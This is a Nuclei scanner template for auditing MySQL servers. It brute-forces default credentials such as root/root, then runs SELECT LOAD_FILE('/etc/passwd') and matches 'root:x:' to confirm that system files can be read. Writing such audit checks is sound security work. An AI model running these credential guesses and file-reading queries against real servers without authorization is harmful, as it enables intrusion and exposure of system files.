id: mysql-load-file
info:
  author: pussycat0x
  description: 'The LOAD_FILE function in MySQL is potentially dangerous if not used
    carefully, as it can pose security risks. The function is designed to read the
    contents of a file on the server and return the file contents as a string. However,
    it can be exploited if not properly restricted or sanitized, leading to security
    vulnerabilities.

    '
  metadata:
    max-request: 16
    shodan-query: port:3306
    verified: true
  name: MySQL LOAD_FILE - Enable
  reference:
  - https://nmap.org/nsedoc/scripts/mysql-databases.html
  severity: high
  tags: js,mysql,network,audit
javascript:
- args:
    Host: '{{Host}}'
    Pass: '{{passwords}}'
    Port: '3306'
    Query: SELECT LOAD_FILE('/etc/passwd')
    User: '{{usernames}}'
  attack: clusterbomb
  code: 'let m = require(''nuclei/mysql'');

    let c = m.MySQLClient();

    let response = c.ExecuteQuery(Host,Port,User,Pass,Query);

    Export(response);

    '
  extractors:
  - json:
    - .Rows[]
    part: response
    type: json
  matchers:
  - dsl:
    - success == true
    type: dsl
  - type: word
    words:
    - 'root:x:'
  matchers-condition: and
  payloads:
    passwords:
    - root
    - admin
    - mysql
    - test
    usernames:
    - root
    - admin
    - mysql
    - test
  stop-at-first-match: true
